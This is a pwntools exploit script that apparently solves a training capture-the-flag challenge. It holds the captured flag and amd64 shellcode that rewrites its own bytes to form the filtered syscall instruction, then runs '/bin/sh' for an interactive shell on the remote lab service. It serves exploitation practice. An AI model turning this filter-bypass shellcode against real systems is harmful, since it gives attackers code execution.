#!/usr/bin/env python3

# flag{nice_job!_self_modifying_shellcode?getting_address_wiht_call?}

from pwn import p32
from pwn import *
import sys

if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 3102)
else:
    p = process("./syscaslr")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x101270
    """)

shellcode = asm("""
mov bl, 0x04
inc bl
mov [rax + 108], bl

mov bl, 0x0e
inc bl
mov [rax + 107], bl
                
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp

mov rax, 0x3b
mov rsi, 0
mov rdx, 0
""", arch='amd64')

payload = shellcode
payload = payload.ljust(1000, b"\x90")

assert len(payload) == 1000, "payload must be of 1000 characters"
assert b"\x0f" not in payload and b"\x05" not in payload, "blocked character found"

p.recvuntil(b"Send shellcode plz?\n")
p.sendline(payload)
p.interactive()
